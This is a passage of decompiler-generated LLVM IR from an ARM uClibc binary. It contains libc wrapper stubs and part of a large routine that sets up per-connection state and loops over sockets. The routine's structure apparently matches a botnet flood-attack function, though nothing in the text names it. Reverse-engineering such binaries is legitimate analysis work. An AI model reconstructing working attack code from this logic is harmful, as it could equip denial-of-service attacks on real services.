  %v7_8d08 = call i32* @realloc(i32* %ptr, i32 %size)
  ret i32* %v7_8d08
}

define i32 @_listen(i32 %fd, i32 %n) local_unnamed_addr {
entry:
  %v6_8d14 = call i32 @listen(i32 %fd, i32 %n)
  ret i32 %v6_8d14
}

define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8d20 = call i32 @fork()
  ret i32 %v4_8d20
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8d2c = call i32 @__uClibc_main()
  ret i32 %v4_8d2c
}

define i32* @_memset(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
entry:
  %v8_8d38 = call i32* @memset(i32* %s, i32 %c, i32 %n)
  ret i32* %v8_8d38
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8d44 = call i32 @getppid()
  ret i32 %v4_8d44
}

define i32 @_time(i32* %timer) local_unnamed_addr {
entry:
  %v6_8d50 = call i32 @time(i32* %timer)
  ret i32 %v6_8d50
}

define %__dirstream* @_opendir(i8* %name) local_unnamed_addr {
entry:
  %v6_8d5c = call %__dirstream* @opendir(i8* %name)
  ret %__dirstream* %v6_8d5c
}

define i32 @_getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen) local_unnamed_addr {
entry:
  %v9_8d68 = call i32 @getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen)
  ret i32 %v9_8d68
}

define i32* @___errno_location() local_unnamed_addr {
entry:
  %v4_8d74 = call i32* @__errno_location()
  ret i32* %v4_8d74
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  call void @exit(i32 %status)
  unreachable
}

define i32 @_atoi(i8* %nptr) local_unnamed_addr {
entry:
  %v6_8d8c = call i32 @atoi(i8* %nptr)
  ret i32 %v6_8d8c
}

define i32 @_open(i8* %file, i32 %oflag, ...) local_unnamed_addr {
entry:
  %v7_8d98 = call i32 (i8*, i32, ...) @open(i8* %file, i32 %oflag)
  ret i32 %v7_8d98
}

define i32 @_clock() local_unnamed_addr {
entry:
  %v4_8da4 = call i32 @clock()
  ret i32 %v4_8da4
}

define i32 @_setsid() local_unnamed_addr {
entry:
  %v4_8db0 = call i32 @setsid()
  ret i32 %v4_8db0
}

define i32 @_closedir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8dbc = call i32 @closedir(%__dirstream* %dirp)
  ret i32 %v6_8dbc
}

define i32 @_fcntl(i32 %fd, i32 %cmd, ...) local_unnamed_addr {
entry:
  %v6_8dc8 = call i32 (i32, i32, ...) @fcntl(i32 %fd, i32 %cmd)
  ret i32 %v6_8dc8
}

define i32 @_close(i32 %fd) local_unnamed_addr {
entry:
  %v5_8dd4 = call i32 @close(i32 %fd)
  ret i32 %v5_8dd4
}

define i32 @_raise(i32 %sig) local_unnamed_addr {
entry:
  %v5_8de0 = call i32 @raise(i32 %sig)
  ret i32 %v5_8de0
}

define void @_free(i32* %ptr) local_unnamed_addr {
entry:
  call void @free(i32* %ptr)
  ret void
}

define i32 @_sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset) local_unnamed_addr {
entry:
  %v9_8df8 = call i32 @sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset)
  ret i32 %v9_8df8
}

define i32 @_getsockname(i32 %fd, %sockaddr* %addr, i32* %len) local_unnamed_addr {
entry:
  %v9_8e04 = call i32 @getsockname(i32 %fd, %sockaddr* %addr, i32* %len)
  ret i32 %v9_8e04
}

define i32 @function_8e08() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8e08 = load i32, i32* @r4, align 4
  store i32 %v3_8e08, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1ccb4.58 to i32), i32* %r5.global-to-local, align 4
  %v2_8e10 = load i8, i8* bitcast (i8** @global_var_1ccb4.58 to i8*), align 4
  %v2_8e14 = icmp eq i8 %v2_8e10, 0
  br i1 %v2_8e14, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8e18 = load i32, i32* @r0, align 4
  ret i32 %v12_8e18

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1cc98.61 to i32), i32* %r4.global-to-local, align 4
  %v2_8e20 = load i32, i32* bitcast (i32** @global_var_1cc98.61 to i32*), align 4
  store i32 %v2_8e20, i32* %r2.global-to-local, align 4
  %v2_8e28 = icmp eq i32 %v2_8e20, 0
  br i1 %v2_8e28, label %bb8, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %bb7, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge
  %v1_8e34 = phi i32 [ %v1_8e34.pre, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ ptrtoint (i32** @global_var_1cc98.61 to i32), %bb7 ]
  %v0_8e30 = phi i32 [ %v2_8e40, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ %v2_8e20, %bb7 ]
  %v1_8e30 = add i32 %v0_8e30, 4
  %v2_8e34 = inttoptr i32 %v1_8e34 to i32*
  store i32 %v1_8e30, i32* %v2_8e34, align 4
  %v0_8e3c = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8e3c)
  %v2_8e40 = load i32, i32* bitcast (i32** @global_var_1cc98.61 to i32*), align 4
  store i32 %v2_8e40, i32* %r2.global-to-local, align 4
  %v2_8e48 = icmp eq i32 %v2_8e40, 0
  br i1 %v2_8e48, label %.loopexit, label %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge

dec_label_pc_8e30.dec_label_pc_8e30_crit_edge:    ; preds = %dec_label_pc_8e30
  %v1_8e34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8e30

.loopexit:                                        ; preds = %dec_label_pc_8e30
  %v2_8e68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8e68 = phi i32 [ %v2_8e68.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1ccb4.58 to i32), %bb7 ]
  %v3_8e68 = inttoptr i32 %v2_8e68 to i8*
  store i8 1, i8* %v3_8e68, align 1
  %v2_8e6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8e6c, i32* %r4.global-to-local, align 4
  %v11_8e6c = load i32, i32* @r0, align 4
  ret i32 %v11_8e6c

; uselistorder directives
  uselistorder i32 %v2_8e40, { 1, 2, 0 }
  uselistorder i32** @global_var_1cc98.61, { 1, 0 }
  uselistorder i8** @global_var_1ccb4.58, { 1, 0 }
  uselistorder label %dec_label_pc_8e30, { 1, 0 }
}

define i32 @function_8e7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8e7c:
  %v0_8e7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8e7c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8e7c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8e7c, %bb
  %v5_8e84 = load i32, i32* @r0, align 4
  ret i32 %v5_8e84

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8e88() local_unnamed_addr {
.thread:
  %v2_8ea8 = load i32, i32* inttoptr (i32 117528 to i32*), align 8
  %v2_8eac = icmp eq i32 %v2_8ea8, 0
  br i1 %v2_8eac, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 117528

bb2:                                              ; preds = %.thread
  ret i32 117528

; uselistorder directives
  uselistorder i32 117528, { 1, 0, 2 }
}

define i32 @function_8ee0() local_unnamed_addr {
dec_label_pc_8ee0:
  %v5_8ee4 = load i32, i32* @r0, align 4
  ret i32 %v5_8ee4
}

; Function Attrs: noreturn
define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8ef0 = ptrtoint i32* %stack_var_4 to i32
  %v7_8f10 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_10168.73 to i32), i32 %arg2, i32 %v4_8ef0, i32 35692, i32 82600, i32 %arg1, i32 %v4_8ef0)
  call void @abort()
  unreachable
}

define i32 @function_8f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8f24:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_8f24 = load i32, i32* @r4, align 4
  store i32 %v3_8f24, i32* %stack_var_-36, align 4
  %v6_8f24 = load i32, i32* @r5, align 4
  %v9_8f24 = load i32, i32* @r6, align 4
  %v15_8f24 = load i32, i32* @r8, align 4
  %v1_8f30 = urem i32 %arg3, 256
  store i32 %v1_8f30, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_8f3c = urem i32 %arg1, 256
  store i32 %v1_8f3c, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_8f30, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8f58 = inttoptr i32 %arg4 to i32*
  %v6_8f58 = call i32 @function_acdc(i32 %v1_8f30, i32* %v5_8f58, i32 21, i32 0, i32 %arg2)
  %v0_8f5c = load i32, i32* @r5, align 4
  store i32 %v0_8f5c, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r4, align 4
  store i32 %v0_8f68, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_142fc.76 to i32), i32* %r3.global-to-local, align 4
  %v5_8f70 = inttoptr i32 %v0_8f5c to i32*
  %v6_8f70 = call i32 @function_acdc(i32 %v0_8f68, i32* %v5_8f70, i32 20, i32 ptrtoint ([4 x i8]* @global_var_142fc.76 to i32), i32 %v6_8f58)
  %v0_8f74 = load i32, i32* @r5, align 4
  store i32 %v0_8f74, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_8f70, i32* %fp.global-to-local, align 4
  %v0_8f84 = load i32, i32* @r4, align 4
  store i32 %v0_8f84, i32* %r0.global-to-local, align 4
  %v5_8f88 = inttoptr i32 %v0_8f74 to i32*
  %v6_8f88 = call i32 @function_acdc(i32 %v0_8f84, i32* %v5_8f88, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8f8c = load i32, i32* @r5, align 4
  store i32 %v0_8f8c, i32* %r1.global-to-local, align 4
  store i32 %v6_8f88, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_14300.78 to i32), i32* %r3.global-to-local, align 4
  %v6_8fa0 = inttoptr i32 %v0_8f8c to i32*
  %v7_8fa0 = call i32 @function_acdc(i32 %v0_8f98, i32* %v6_8fa0, i32 22, i32 ptrtoint ([2 x i8]* @global_var_14300.78 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8fa4 = load i32, i32* @r5, align 4
  store i32 %v0_8fa4, i32* %r1.global-to-local, align 4
  store i32 %v7_8fa0, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8fb0 = load i32, i32* @r4, align 4
  store i32 %v0_8fb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8fb8 = inttoptr i32 %v0_8fa4 to i32*
  %v5_8fb8 = call i32 @function_b240(i32 %v0_8fb0, i32* %v4_8fb8, i32 24, i32 1)
  %v0_8fbc = load i32, i32* @r5, align 4
  store i32 %v0_8fbc, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8fb8, i32* @r6, align 4
  %v0_8fcc = load i32, i32* @r4, align 4
  store i32 %v0_8fcc, i32* %r0.global-to-local, align 4
  %v4_8fd0 = inttoptr i32 %v0_8fbc to i32*
  %v5_8fd0 = call i32 @function_b240(i32 %v0_8fcc, i32* %v4_8fd0, i32 7, i32 80)
  %v2_8fd8 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8fe0 = mul i32 %v5_8fd0, 65536
  store i32 %v3_8fe0, i32* %r3.global-to-local, align 4
  %tmp200 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8ff4 = urem i32 %v5_8fd0, 65536
  store i32 %v3_8ff4, i32* %r8.global-to-local, align 4
  %v4_8ff8 = call i32* @memset(i32* nonnull %stack_var_-20809, i32 0, i32 10241)
  %v6_8ff8 = ptrtoint i32* %v4_8ff8 to i32
  store i32 %v6_8ff8, i32* %r0.global-to-local, align 4
  %v0_8ffc = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8ffc = icmp slt i32 %v0_8ffc, 0
  store i1 %v1_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v2_8ffc = icmp eq i32 %v0_8ffc, 0
  store i1 %v2_8ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ffc, label %.thread14, label %bb

bb:                                               ; preds = %dec_label_pc_8f24
  %v1_9000 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_9000 = icmp slt i32 %v1_9000, 0
  store i1 %v2_9000, i1* %cpsr_n.global-to-local, align 1
  %v3_9000 = icmp eq i32 %v1_9000, 0
  store i1 %v3_9000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9000, label %bb201, label %dec_label_pc_901c

.thread14:                                        ; preds = %dec_label_pc_8f24
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

bb201:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %bb201, %dec_label_pc_903c, %.thread14, %dec_label_pc_902c, %dec_label_pc_901c
  %v29_9018 = phi i32 [ %v2_9040, %dec_label_pc_903c ], [ %v6_8ff8, %.thread14 ], [ %v6_8ff8, %bb201 ], [ %v2_9030, %dec_label_pc_902c ], [ %v2_9020, %dec_label_pc_901c ]
  %v2_9018 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_9018, i32* %r4.global-to-local, align 4
  store i32 %v6_8f24, i32* %r5.global-to-local, align 4
  store i32 %v9_8f24, i32* %r6.global-to-local, align 4
  store i32 %v15_8f24, i32* %r8.global-to-local, align 4
  ret i32 %v29_9018

dec_label_pc_901c:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8ffc, i32* %r0.global-to-local, align 4
  %v1_9020 = inttoptr i32 %v0_8ffc to i8*
  %v2_9020 = call i32 @function_1399c(i8* %v1_9020)
  store i32 %v2_9020, i32* %r0.global-to-local, align 4
  %v1_9024 = add i32 %v2_9020, -255
  %v2_9024 = icmp ugt i32 %v2_9020, 254
  store i1 %v2_9024, i1* %cpsr_c.global-to-local, align 1
  %v3_9024 = sub i32 254, %v2_9020
  %v4_9024 = and i32 %v3_9024, %v2_9020
  %v5_9024 = icmp slt i32 %v4_9024, 0
  store i1 %v5_9024, i1* %cpsr_v.global-to-local, align 1
  %v6_9024 = icmp slt i32 %v1_9024, 0
  store i1 %v6_9024, i1* %cpsr_n.global-to-local, align 1
  %v7_9024 = icmp eq i32 %v2_9020, 255
  store i1 %v7_9024, i1* %cpsr_z.global-to-local, align 1
  %v8_9028 = icmp sgt i32 %v2_9020, 255
  br i1 %v8_9028, label %dec_label_pc_9010, label %dec_label_pc_902c

dec_label_pc_902c:                                ; preds = %dec_label_pc_901c
  %v0_902c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_902c, i32* %r0.global-to-local, align 4
  %v1_9030 = inttoptr i32 %v0_902c to i8*
  %v2_9030 = call i32 @function_1399c(i8* %v1_9030)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  %v1_9034 = add i32 %v2_9030, -127
  %v2_9034 = icmp ugt i32 %v2_9030, 126
  store i1 %v2_9034, i1* %cpsr_c.global-to-local, align 1
  %v3_9034 = sub i32 126, %v2_9030
  %v4_9034 = and i32 %v3_9034, %v2_9030
  %v5_9034 = icmp slt i32 %v4_9034, 0
  store i1 %v5_9034, i1* %cpsr_v.global-to-local, align 1
  %v6_9034 = icmp slt i32 %v1_9034, 0
  store i1 %v6_9034, i1* %cpsr_n.global-to-local, align 1
  %v7_9034 = icmp eq i32 %v2_9030, 127
  store i1 %v7_9034, i1* %cpsr_z.global-to-local, align 1
  %v8_9038 = icmp sgt i32 %v2_9030, 127
  br i1 %v8_9038, label %dec_label_pc_9010, label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_902c
  %v0_903c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_903c, i32* %r0.global-to-local, align 4
  %v1_9040 = inttoptr i32 %v0_903c to i8*
  %v2_9040 = call i32 @function_1399c(i8* %v1_9040)
  store i32 %v2_9040, i32* %r0.global-to-local, align 4
  %v1_9044 = add i32 %v2_9040, -9
  %v2_9044 = icmp ugt i32 %v2_9040, 8
  store i1 %v2_9044, i1* %cpsr_c.global-to-local, align 1
  %v3_9044 = sub i32 8, %v2_9040
  %v4_9044 = and i32 %v3_9044, %v2_9040
  %v5_9044 = icmp slt i32 %v4_9044, 0
  store i1 %v5_9044, i1* %cpsr_v.global-to-local, align 1
  %v6_9044 = icmp slt i32 %v1_9044, 0
  store i1 %v6_9044, i1* %cpsr_n.global-to-local, align 1
  %v7_9044 = icmp eq i32 %v2_9040, 9
  store i1 %v7_9044, i1* %cpsr_z.global-to-local, align 1
  %v7_9048 = icmp sgt i32 %v2_9040, 9
  br i1 %v7_9048, label %dec_label_pc_9010, label %bb202

bb202:                                            ; preds = %dec_label_pc_903c
  %v10_9048 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v8_904c = load i32, i32* @r4, align 4
  %v10_904c = add i32 %v10_9048, 364
  %v11_904c = inttoptr i32 %v10_904c to i32*
  store i32 %v8_904c, i32* %v11_904c, align 4
  br label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %bb202, %bb206
  %v0_9054 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9054, i32* %r0.global-to-local, align 4
  %v1_9058 = inttoptr i32 %v0_9054 to i8*
  %v2_9058 = call i32 @function_1399c(i8* %v1_9058)
  store i32 %v2_9058, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9060 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  %v2_9064 = sub i32 %v2_9058, %v3_9060
  %v3_9064 = icmp uge i32 %v2_9058, %v3_9060
  store i1 %v3_9064, i1* %cpsr_c.global-to-local, align 1
  %v4_9064 = xor i32 %v3_9060, %v2_9058
  %v5_9064 = xor i32 %v2_9064, %v2_9058
  %v6_9064 = and i32 %v5_9064, %v4_9064
  %v7_9064 = icmp slt i32 %v6_9064, 0
  store i1 %v7_9064, i1* %cpsr_v.global-to-local, align 1
  %v8_9064 = icmp slt i32 %v2_9064, 0
  store i1 %v8_9064, i1* %cpsr_n.global-to-local, align 1
  %v9_9064 = icmp eq i32 %v2_9058, %v3_9060
  store i1 %v9_9064, i1* %cpsr_z.global-to-local, align 1
  %v7_9068 = icmp sgt i32 %v2_9058, %v3_9060
  br i1 %v7_9068, label %dec_label_pc_906c, label %dec_label_pc_9098

dec_label_pc_906c:                                ; preds = %dec_label_pc_9054
  %v0_906c = load i32, i32* %fp.global-to-local, align 4
  %v2_906c = add i32 %v0_906c, %v3_9060
  %v3_906c = inttoptr i32 %v2_906c to i8*
  %v4_906c = load i8, i8* %v3_906c, align 1
  %v6_906c = zext i8 %v4_906c to i32
  %v1_9070 = add nsw i32 %v6_906c, -32
  store i32 %v1_9070, i32* %r2.global-to-local, align 4
  %v1_9074 = add nsw i32 %v6_906c, -97
  store i32 %v1_9074, i32* %r3.global-to-local, align 4
  %v2_9078 = icmp ugt i32 %v1_9074, 24
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub nsw i32 121, %v6_906c
  %v4_9078 = and i32 %v3_9078, %v1_9074
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp ult i8 %v4_906c, 122
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9074, 25
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  %v2_907c = xor i1 %v2_9078, true
  %v3_907c = or i1 %v7_9078, %v2_907c
  br i1 %v3_907c, label %bb203, label %bb204

bb203:                                            ; preds = %dec_label_pc_906c
  %v5_907c = trunc i32 %v1_9070 to i8
  store i8 %v5_907c, i8* %v3_906c, align 1
  %v0_9080.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_9080.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb204

bb204:                                            ; preds = %dec_label_pc_906c, %bb203
  %v1_9084 = phi i1 [ %v2_9078, %dec_label_pc_906c ], [ %v1_9080.pre, %bb203 ]
  %v0_9084 = phi i1 [ false, %dec_label_pc_906c ], [ %v0_9080.pre, %bb203 ]
  %v2_9080 = xor i1 %v1_9084, true
  %v3_9080 = or i1 %v0_9084, %v2_9080
  br i1 %v3_9080, label %bb205, label %._crit_edge

._crit_edge:                                      ; preds = %bb204
  %v0_908c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb206

bb205:                                            ; preds = %bb204
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v7_9084 = load i32, i32* %v11_904c, align 4
  store i32 %v7_9084, i32* %ip.global-to-local, align 4
  br label %bb206

bb206:                                            ; preds = %._crit_edge, %bb205
  %v0_908c = phi i32 [ %v0_908c.pre, %._crit_edge ], [ %v7_9084, %bb205 ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v1_908c = add i32 %v0_908c, 1
  store i32 %v1_908c, i32* %ip.global-to-local, align 4
  store i32 %v1_908c, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9054

dec_label_pc_9098:                                ; preds = %dec_label_pc_9054
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_909c = call i32 @function_13074(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_90a4 = call i32 @function_13074(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_90ac = call i32 @function_13074(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_90b4 = call i32 @function_13074(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_90bc = call i32 @function_13074(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_90c4 = call i32 @function_13074(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_90cc = call i32 @function_13074(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_90d4 = call i32 @function_13074(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90dc = call i32 @function_13074(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_90e4 = call i32 @function_13074(i32 45)
  store i32 %v1_90e4, i32* %r0.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r6, align 4
  %v2_90e8 = add i32 %v0_90e8, -256
  %v3_90e8 = icmp ugt i32 %v0_90e8, 255
  store i1 %v3_90e8, i1* %cpsr_c.global-to-local, align 1
  %v4_90e8 = sub i32 255, %v0_90e8
  %v5_90e8 = and i32 %v4_90e8, %v0_90e8
  %v6_90e8 = icmp slt i32 %v5_90e8, 0
  store i1 %v6_90e8, i1* %cpsr_v.global-to-local, align 1
  %v7_90e8 = icmp slt i32 %v2_90e8, 0
  store i1 %v7_90e8, i1* %cpsr_n.global-to-local, align 1
  %v8_90e8 = icmp eq i32 %v0_90e8, 256
  store i1 %v8_90e8, i1* %cpsr_z.global-to-local, align 1
  %v5_90ec = icmp slt i32 %v0_90e8, 256
  br i1 %v5_90ec, label %thread-pre-split, label %bb207

bb207:                                            ; preds = %dec_label_pc_9098
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_9098, %bb207
  %v0_90f4 = phi i32 [ 256, %bb207 ], [ %v0_90e8, %dec_label_pc_9098 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_90f8 = call i32 @function_13074(i32 46)
  store i32 %v0_90f4, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_9108 = call i32* @calloc(i32 %v0_90f4, i32 3140)
  %v3_9108 = ptrtoint i32* %v2_9108 to i32
  store i32 %v3_9108, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9110 = icmp slt i32 %v0_90f4, 0
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  %v2_9110 = icmp eq i32 %v0_90f4, 0
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9108, i32* @r5, align 4
  %tmp208 = icmp slt i32 %v0_90f4, 1
  br i1 %tmp208, label %dec_label_pc_924c, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_9120
  %v1_9130 = phi i32 [ %v1_abe4, %dec_label_pc_abc8 ], [ %v3_9108, %dec_label_pc_9120 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_8f3c, i32* %r1.global-to-local, align 4
  %v2_9130 = inttoptr i32 %v1_9130 to i32*
  store i32 -1, i32* %v2_9130, align 4
  %v0_9134 = load i32, i32* %r3.global-to-local, align 4
  %v1_9134 = trunc i32 %v0_9134 to i8
  %v2_9134 = load i32, i32* @r5, align 4
  %v3_9134 = add i32 %v2_9134, 4
  %v4_9134 = inttoptr i32 %v3_9134 to i8*
  store i8 %v1_9134, i8* %v4_9134, align 1
  %v0_9138 = load i32, i32* @r7, align 4
  %v1_913c = load i32, i32* %r1.global-to-local, align 4
  %v2_913c = srem i32 %v0_9138, %v1_913c
  store i32 %v2_913c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_9148 = and i32 %v2_913c, 536870912
  %v3_9148 = icmp ne i32 %v2_9148, 0
  store i1 %v3_9148, i1* %cpsr_c.global-to-local, align 1
  %v5_9148 = mul i32 %v2_913c, 24
  store i32 %v5_9148, i32* %r3.global-to-local, align 4
  %v2_914c = add i32 %v5_9148, %arg2
  store i32 %v2_914c, i32* @r6, align 4
  %v1_9150 = add i32 %v2_914c, 16
  %v2_9150 = inttoptr i32 %v1_9150 to i32*
  %v3_9150 = load i32, i32* %v2_9150, align 4
  store i32 %v3_9150, i32* %r2.global-to-local, align 4
  %v0_9154 = load i32, i32* @r5, align 4
  %v1_9154 = add i32 %v0_9154, 532
  store i32 %v1_9154, i32* %lr.global-to-local, align 4
  store i32 %v1_9154, i32* @r0, align 4
  %v0_915c = load i32, i32* @sl, align 4
  store i32 %v0_915c, i32* %r1.global-to-local, align 4
  %v2_9160 = add i32 %v0_9154, 16
  %v3_9160 = inttoptr i32 %v2_9160 to i32*
  store i32 %v3_9150, i32* %v3_9160, align 4
  %v0_9164 = load i32, i32* %lr.global-to-local, align 4
  %v2_9168 = inttoptr i32 %v1_9154 to i8*
